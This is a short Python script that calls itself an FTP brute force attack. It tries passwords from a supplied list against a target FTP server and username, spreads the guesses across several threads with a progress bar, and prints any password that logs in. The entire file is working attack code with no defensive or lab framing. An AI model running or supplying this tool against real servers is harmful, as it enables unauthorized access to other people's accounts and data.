import ftplib
import threading
from tqdm import tqdm

def try_password(ftp_server, ftp_user, password, stop_event):
    if stop_event.is_set():
        return False

    try:
        ftp = ftplib.FTP(ftp_server)
        ftp.login(ftp_user, password)
        stop_event.set()
        ftp.quit()
        return True
    except ftplib.error_perm:
        return False
    except Exception as e:
        print(f"Error: {e}")
        return False

def attack(target, user, passwords, num_threads=4):
    stop_event = threading.Event()
    found_password = [None]  # Use a list to store the found password (mutable)

    def thread_function(passwords, pbar):
        for password in passwords:
            if stop_event.is_set():
                break
            if try_password(target, user, password, stop_event):
                found_password[0] = password
                break
            pbar.update(1)

    def split_passwords(passwords, num_threads):
        k, m = divmod(len(passwords), num_threads)
        return [passwords[i * k + min(i, m):(i + 1) * k + min(i + 1, m)] for i in range(num_threads)]

    password_lists = split_passwords(passwords, num_threads)
    threads = []

    with tqdm(total=len(passwords)) as pbar:
        for i in range(num_threads):
            t = threading.Thread(target=thread_function, args=(password_lists[i], pbar))
            threads.append(t)
            t.start()

        for t in threads:
            t.join()

    if found_password[0]:
        print(f"[+] Password found: {found_password[0]}")
    else:
        print("[-] Password not found.")
    print("FTP brute force attack completed.")
